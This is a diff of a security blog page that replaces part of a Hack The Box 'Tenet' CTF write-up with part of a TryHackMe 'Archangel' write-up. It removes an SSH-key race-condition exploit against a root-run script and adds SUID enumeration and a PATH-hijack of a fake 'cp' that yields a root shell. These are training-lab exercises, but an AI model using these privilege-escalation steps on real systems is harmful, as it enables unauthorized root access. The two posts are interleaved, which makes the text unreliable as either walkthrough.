+<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre></td><td class="rouge-code"><pre>archangel@ubuntu:~/secret$ cat user2.txt
+cat user2.txt
+thm{h0r-------------------------------------r0n}
 
-<h3 id="user">User</h3>
+</pre></td></tr></tbody></table></code></div></div>
+<h2 id="privilage-escalation">Privilage Escalation</h2>
 
-<p>After looking around i found wp-config which is contain credential of user :</p>
-
-<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/htb_tenet/bg_5.png" alt="image" /></p>
-
+<p>after get in user archangel we can check the permission :</p>
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
@@ -852,37 +966,34 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 6
 7
 8
-</pre></td><td class="rouge-code"><pre>neil@tenet:/var/www/html/wordpress$ id
-uid=1001(neil) gid=1001(neil) groups=1001(neil)
-neil@tenet:/var/www/html/wordpress$ cd /home/neil/
-neil@tenet:~$ ls
-user.txt
-neil@tenet:~$ cat user.txt 
-6a9d38459e130f9f9a0c56958f96a1a1
-neil@tenet:~$ 
+9
+10
+11
+12
+13
+14
+15
+16
+17
+</pre></td><td class="rouge-code"><pre>$ find / -perm -u=s -type f 2&gt;/dev/null
+/usr/bin/newgrp
+/usr/bin/gpasswd
+/usr/bin/chfn
+/usr/bin/chsh
+/usr/bin/passwd
+/usr/bin/traceroute6.iputils
+/usr/bin/sudo
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/bin/umount
+/bin/su
+/bin/mount
+/bin/fusermount
+/bin/ping
+/home/archangel/secret/backup
 </pre></td></tr></tbody></table></code></div></div>
-<p>We got user.txt</p>
-
-<h3 id="privilage-escalation">Privilage Escalation</h3>
-
-<p>lets look privilage of user neil :</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-2
-3
-4
-5
-6
-7
-</pre></td><td class="rouge-code"><pre>neil@tenet:~$ sudo -l
-Matching Defaults entries for neil on tenet:
-    env_reset, mail_badpass,
-    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:
-
-User neil may run the following commands on tenet:
-    (ALL : ALL) NOPASSWD: /usr/local/bin/enableSSH.sh
-</pre></td></tr></tbody></table></code></div></div>
-<p>we have to access : /usr/local/bin/enableSSH.sh</p>
+<p>lets check file backup with strings :</p>
 <div class="language-bat highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
@@ -924,86 +1035,178 @@ User neil may run the following commands on tenet:
 39
 40
 41
-</pre></td><td class="rouge-code"><pre><span class="kd">neil</span>@tenet:<span class="o">~</span>$ <span class="kd">cat</span> <span class="na">/usr/local/bin/enableSSH</span>.sh
-#<span class="err">!</span><span class="na">/bin/bash
-
-</span><span class="kd">checkAdded</span><span class="o">()</span> <span class="o">{</span>
-
-        <span class="kd">sshName</span><span class="o">=</span>$<span class="o">(</span><span class="na">/bin/echo </span>$key <span class="o">|</span> <span class="na">/usr/bin/cut -d </span><span class="s2">" "</span> <span class="na">-f </span><span class="m">3</span><span class="o">)</span>
-        <span class="k">if</span> <span class="o">[[</span> <span class="err">!</span> <span class="na">-z </span>$<span class="o">(</span><span class="na">/bin/grep </span>$sshName <span class="na">/root</span>/.ssh/authorized_keys<span class="o">)</span> <span class="o">]];</span> <span class="kd">then</span>
-                <span class="na">/bin/echo </span><span class="s2">"Successfully added $sshName to authorized_keys file</span><span class="err">!</span><span class="s2">"</span>
-        <span class="k">else</span>
-                <span class="na">/bin/echo </span><span class="s2">"Error in adding $sshName to authorized_keys file</span><span class="err">!</span><span class="s2">"</span>
-        <span class="kd">fi</span>
-
-<span class="o">}</span>
-
-<span class="kd">checkFile</span><span class="o">()</span> <span class="o">{</span>
-
-        <span class="k">if</span> <span class="o">[[</span> <span class="err">!</span> <span class="na">-s </span>$1 <span class="o">]]</span> <span class="o">||</span> <span class="o">[[</span> <span class="err">!</span> <span class="na">-f </span>$1 <span class="o">]];</span> <span class="kd">then</span>
-                <span class="na">/bin/echo </span><span class="s2">"Error in creating key file</span><span class="err">!</span><span class="s2">"</span>
-
-                <span class="k">if</span> <span class="o">[[</span> <span class="na">-f </span>$1 <span class="o">]];</span> <span class="kd">then</span> <span class="na">/bin/rm </span>$1<span class="o">;</span> <span class="kd">fi</span>
-
-                <span class="k">exit</span> <span class="m">1</span>
-        <span class="kd">fi</span>
-<span class="o">}</span>
-
-<span class="kd">addKey</span><span class="o">()</span> <span class="o">{</span>
-
-        <span class="kd">tmpName</span><span class="o">=</span>$<span class="o">(</span><span class="kd">mktemp</span> <span class="na">-u /tmp/ssh-XXXXXXXX</span><span class="o">)</span>
-
-        <span class="o">(</span><span class="kd">umask</span> <span class="m">110</span><span class="o">;</span> <span class="nb">touch</span> $tmpName<span class="o">)</span>
-
-        <span class="na">/bin/echo </span>$key <span class="o">&gt;&gt;</span>$tmpName
-
-        <span class="kd">checkFile</span> $tmpName
-
-        <span class="na">/bin/cat </span>$tmpName <span class="o">&gt;&gt;</span><span class="na">/root</span>/.ssh/authorized_keys
-
-        <span class="na">/bin/rm </span>$tmpName
-
-<span class="o">}</span>
-
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+66
+67
+68
+69
+70
+71
+72
+73
+74
+75
+76
+77
+78
+79
+80
+</pre></td><td class="rouge-code"><pre><span class="kd">archangel</span>@ubuntu:<span class="o">~</span><span class="na">/secret</span>$ <span class="nb">strings</span> <span class="kd">backup</span>
+<span class="nb">strings</span> <span class="kd">backup</span>
+<span class="na">/lib</span><span class="m">64</span><span class="na">/ld-linux-x</span><span class="m">86</span><span class="o">-</span><span class="m">64</span>.so.2
+<span class="kd">setuid</span>
+<span class="kd">system</span>
+__cxa_finalize
+<span class="kd">setgid</span>
+__libc_start_main
+<span class="kd">libc</span>.so.6
+<span class="kd">GLIBC_2</span>.2.5
+_ITM_deregisterTMCloneTable
+__gmon_start__
+_ITM_registerTMCloneTable
+<span class="kd">u</span><span class="na">+UH
+</span><span class="o">[]</span><span class="kd">A</span>\A<span class="o">]</span><span class="kd">A</span><span class="se">^A</span>_
+<span class="kd">cp</span> <span class="na">/home/user/archangel/myfiles</span>/<span class="o">*</span> <span class="na">/opt/backupfiles
+</span>:<span class="o">*</span><span class="m">3</span>$<span class="s2">"
+GCC: (Ubuntu 10.2.0-13ubuntu1) 10.2.0
+/usr/lib/gcc/x86_64-linux-gnu/10/../../../x86_64-linux-gnu/Scrt1.o
+__abi_tag
+crtstuff.c
+deregister_tm_clones
+__do_global_dtors_aux
+completed.0
+__do_global_dtors_aux_fini_array_entry
+frame_dummy
+__frame_dummy_init_array_entry
+backup.c
+__FRAME_END__
+__init_array_end
+_DYNAMIC
+__init_array_start
+__GNU_EH_FRAME_HDR
+_GLOBAL_OFFSET_TABLE_
+__libc_csu_fini
+_ITM_deregisterTMCloneTable
+_edata
+system@@GLIBC_2.2.5
+__libc_start_main@@GLIBC_2.2.5
+__data_start
+__gmon_start__
+__dso_handle
+_IO_stdin_used
+__libc_csu_init
+__bss_start
+main
+setgid@@GLIBC_2.2.5
+__TMC_END__
+_ITM_registerTMCloneTable
+setuid@@GLIBC_2.2.5
+__cxa_finalize@@GLIBC_2.2.5
+.symtab
+.strtab
+.shstrtab
+.interp
+.note.gnu.property
+.note.gnu.build-id
+.note.ABI-tag
+.gnu.hash
+.dynsym
+.dynstr
+.gnu.version
+.gnu.version_r
+.rela.dyn
+.rela.plt
+.init
+.plt.got
+.plt.sec
+.text
+.fini
+.rodata
+.eh_frame_hdr
+.eh_frame
+.init_array
+.fini_array
+.dynamic
+.data
+.bss
+.comment
+archangel@ubuntu:~/secret$
+</span></pre></td></tr></tbody></table></code></div></div>
+<p>i found this :</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>cp /home/user/archangel/myfiles/* /opt/backupfiles
 </pre></td></tr></tbody></table></code></div></div>
-<p>from thats script we can inject to getting root.</p>
-<ul>
-  <li>first create id_rsa on your machine ` ssh-keygen `</li>
-  <li>then create script like this :
-    <div class="language-bat highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-2
-3
-4
-</pre></td><td class="rouge-code"><pre><span class="kd">while</span> <span class="kd">true</span>
-<span class="k">do</span> 
-<span class="nb">echo</span> <span class="s1">' put id_rsa.pub'</span> <span class="o">|</span><span class="kd">tee</span> <span class="na">/tmp/ssh</span><span class="o">-*</span>
-<span class="kd">done</span>
-</pre></td></tr></tbody></table></code></div>    </div>
-  </li>
-  <li>then put id_rsa.pub to script
-    <div class="language-bat highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-2
-3
-4
-</pre></td><td class="rouge-code"><pre><span class="kd">while</span> <span class="kd">true</span>
-<span class="k">do</span> 
-<span class="nb">echo</span> <span class="s1">'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCuC30kS7Gb89F8nYQetIKn6mgjGSA5nmX8fn3WQ2Gim+iBJPTmeIF6skdkM4z8//gejqC9RP5TkkuOIhxPcbI5i8Jz5lF2DbvLeUSJp2OfVQuI4DxmHTGwzMvIA40hkYSvwvgYErJAfZLLOuNyMOH6s4g6Ng970947N9P1094Z1fzavO4ahYHrM9Uyje6ceUIBstZe4Ma57Rgi3FCV8tmUkmS/gskWo1cR2pTmtucvsP8rGB2+X86y/pLkd3iipX4k2DhOCeSH894roy6uLB0+EEg3pRo2Ge0IOym0KI5o11gt0JS3hwF9I2REwODyolH5j/lZBtngDag2oCC5KqWVJGd6yha+nCmZWwifckFEpNbfNA0L3gSxpQJ5aE/xKJZffcMPfMdBHZzoz2q53XKmBUhXKeORsU42KiV+CbPxinz6OjXcSsIpw3IB/99HpoMW2tFZKLZYZVcM9vWjCg7Q2CJZUgPrwNBBSTi3LlFzSkmPsQXxclDA21fPnBmip1c='</span> <span class="o">|</span><span class="kd">tee</span> <span class="na">/tmp/ssh</span><span class="o">-*</span>
-<span class="kd">done</span>
-</pre></td></tr></tbody></table></code></div>    </div>
-  </li>
-  <li>chmod 600 to id_rsa</li>
-  <li>then run the scipt ./looping.sh</li>
-  <li>script will still looping, we can leave that alone and log in again at a different term</li>
-  <li>in second term run this “ sudo /usr/local/bin/enableSSH.sh “ for 4 times</li>
-  <li>and we connect in hacker machines :
-    <div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-</pre></td><td class="rouge-code"><pre>ssh -i id_rsa root@10.10.10.223
-</pre></td></tr></tbody></table></code></div>    </div>
-    <p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/htb_tenet/bg_root.png" alt="image" /></p>
-  </li>
-</ul>
+<p>In the hint they have also mentioned about “certain paths are dangerous”. This is all coming together, cp command is being executed without absolute path (/bin/cp), that means when this binary get executed, our shell search for “cp” in each directory in the path list to look fo the executable file by that name. Then shell will then run the first matching program it finds.</p>
 
-<p>if thats doesn’t work you can reply again until it works</p>
+<p>as we can see this path where its source and destination of copy command is being executed and We can take advantage of this misconfiguration in SUID binary (backup). you can follow my command :</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre></td><td class="rouge-code"><pre>archangel@ubuntu:~/secret$ echo '#!/bin/bash' &gt; cp
+archangel@ubuntu:~/secret$ ls
+backup  cp  user2.txt
+archangel@ubuntu:~/secret$ echo "/bin/bash" &gt;&gt; cp
+archangel@ubuntu:~/secret$ chmod +x cp
+archangel@ubuntu:~/secret$ cat cp
+#!/bin/bash
+/bin/bash
+</pre></td></tr></tbody></table></code></div></div>
+<p>and we can update path for executing backup</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre></td><td class="rouge-code"><pre>archangel@ubuntu:~/secret$ export PATH=$PWD:$PATH
+archangel@ubuntu:~/secret$ echo $PATH
+/home/archangel/secret:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+archangel@ubuntu:~/secret$
+</pre></td></tr></tbody></table></code></div></div>
+<h3 id="flag-root">Flag Root</h3>
+<p>Now just run the backup :</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre></td><td class="rouge-code"><pre>archangel@ubuntu:~/secret$ ./backup 
+root@ubuntu:~/secret# cd
+root@ubuntu:~# id
+uid=0(root) gid=0(root) groups=0(root),1001(archangel)
+root@ubuntu:~# cat /root/root.txt 
+thm{p4t--------------------------------------------------------10n}
+root@ubuntu:~# 
+</pre></td></tr></tbody></table></code></div></div>
+<p>Yeay we get the root flag</p>
 
 <p>Happy hacking :D</p>
 
@@ -1018,7 +1221,7 @@ User neil may run the following commands on tenet:
           <i class="far fa-folder-open fa-fw mr-1"></i>
           
             <a href='/categories/writeup/'>Writeup</a>,
-            <a href='/categories/hackthebox/'>Hackthebox</a>
+            <a href='/categories/tryhackme/'>Tryhackme</a>
         </div>
         
 
@@ -1027,26 +1230,23 @@ User neil may run the following commands on tenet:
         <div class="post-tags">
           <i class="fa fa-tags fa-fw mr-1"></i>
           
-          <a href="/tags/enumeration/"
-            class="post-tag no-text-decoration" >enumeration</a>
+          <a href="/tags/medium-box/"
+            class="post-tag no-text-decoration" >medium-box</a>
+          
+          <a href="/tags/lfi/"
+            class="post-tag no-text-decoration" >lfi</a>
           
           <a href="/tags/boot2root/"
             class="post-tag no-text-decoration" >boot2root</a>
           
-          <a href="/tags/medium-box/"
-            class="post-tag no-text-decoration" >medium-box</a>
-          
-          <a href="/tags/rce-php/"
-            class="post-tag no-text-decoration" >rce php</a>
+          <a href="/tags/privilage-escalation/"
+            class="post-tag no-text-decoration" >privilage escalation</a>
           
           <a href="/tags/web-exploitation/"
             class="post-tag no-text-decoration" >web exploitation</a>
           
-          <a href="/tags/privilage-escalation/"
-            class="post-tag no-text-decoration" >privilage escalation</a>
-          
-          <a href="/tags/cve/"
-            class="post-tag no-text-decoration" >cve</a>
+          <a href="/tags/reversing-binary/"
+            class="post-tag no-text-decoration" >reversing binary</a>
           
           </div>
         
@@ -1073,25 +1273,25 @@ User neil may run the following commands on tenet:
 
     
       
-        <a href="https://twitter.com/intent/tweet?text=Hackthebox Tenet - Razor-Sec&url=/posts/writeup-hackthebox-tenet/" data-toggle="tooltip" data-placement="top"
+        <a href="https://twitter.com/intent/tweet?text=Tryhackme Archangel - Razor-Sec&url=/posts/writeup-tryhackme-archanel/" data-toggle="tooltip" data-placement="top"
           title="Twitter" target="_blank" rel="noopener" aria-label="Twitter">
           <i class="fa-fw fab fa-twitter"></i>
         </a>
     
       
-        <a href="https://www.facebook.com/sharer/sharer.php?title=Hackthebox Tenet - Razor-Sec&u=/posts/writeup-hackthebox-tenet/" data-toggle="tooltip" data-placement="top"
+        <a href="https://www.facebook.com/sharer/sharer.php?title=Tryhackme Archangel - Razor-Sec&u=/posts/writeup-tryhackme-archanel/" data-toggle="tooltip" data-placement="top"
           title="Facebook" target="_blank" rel="noopener" aria-label="Facebook">
           <i class="fa-fw fab fa-facebook-square"></i>
         </a>
     
       
-        <a href="https://telegram.me/share?text=Hackthebox Tenet - Razor-Sec&url=/posts/writeup-hackthebox-tenet/" data-toggle="tooltip" data-placement="top"
+        <a href="https://telegram.me/share?text=Tryhackme Archangel - Razor-Sec&url=/posts/writeup-tryhackme-archanel/" data-toggle="tooltip" data-placement="top"
           title="Telegram" target="_blank" rel="noopener" aria-label="Telegram">
           <i class="fa-fw fab fa-telegram"></i>
         </a>
     
       
-        <a href="https://www.linkedin.com/sharing/share-offsite/?url=/posts/writeup-hackthebox-tenet/" data-toggle="tooltip" data-placement="top"
+        <a href="https://www.linkedin.com/sharing/share-offsite/?url=/posts/writeup-tryhackme-archanel/" data-toggle="tooltip" data-placement="top"
           title="Linkedin" target="_blank" rel="noopener" aria-label="Linkedin">
           <i class="fa-fw fab fa-linkedin"></i>
         </a>
@@ -1649,20 +1849,20 @@ User neil may run the following commands on tenet:
   
 
   
-
-  
-
-  
-
-  
-
-  
-
-
-  
-
-  
     
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
   
 
   
@@ -1821,7 +2021,7 @@ S...
       
       
       <div class="card">
-        <a href="/posts/writeup-tryhackme-archanel/">
+        <a href="/posts/writeup-hackthebox-tenet/">
           <div class="card-body">
             <!--
   Date format snippet
@@ -1838,14 +2038,14 @@ S...
   
 
   
-    Feb 12, 2020
+    Feb 11, 2020
   
 
-  <i class="unloaded">2020-02-12T00:00:00+07:00</i>
+  <i class="unloaded">2020-02-11T00:00:00+07:00</i>
 
 </span>
 
-            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Tryhackme Archangel</h3>
+            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox Tenet</h3>
             <div class="text-muted small">
               <p>
                 
@@ -1855,7 +2055,8 @@ S...
 
 
                 Introduction
-This is partical room from tryhackme entitled archangel with easy difficulty, but for me its medium difficulty. In this room we will learn about boot2root, Web Exploitation. room link ...
+
+The tenet machine of Hackthebox is an active machine. here we will learn a lot about RCE in php and other privileges. I suggest you read all of these writeups to understand what’s goi...
               </p>
             </div>
           </div>
@@ -1925,17 +2126,17 @@ Then you must see the source ...
 
 <div class="post-navigation d-flex justify-content-between">
   
-  <a href="/posts/writeup-tryhackme-madeye-castle/" class="btn btn-outline-primary"
+  <a href="/posts/writeup-hackthebox-tenet/" class="btn btn-outline-primary"
     prompt="Older">
-    <p>Tryhackme Madeye's Castle</p>
+    <p>Hackthebox Tenet</p>
   </a>
   
 
   
-  <a href="/posts/writeup-tryhackme-archanel/" class="btn btn-outline-primary"
+  <span class="btn btn-outline-primary disabled"
     prompt="Newer">
-    <p>Tryhackme Archangel</p>
-  </a>
+    <p>-</p>
+  </span>
   
 
 </div>
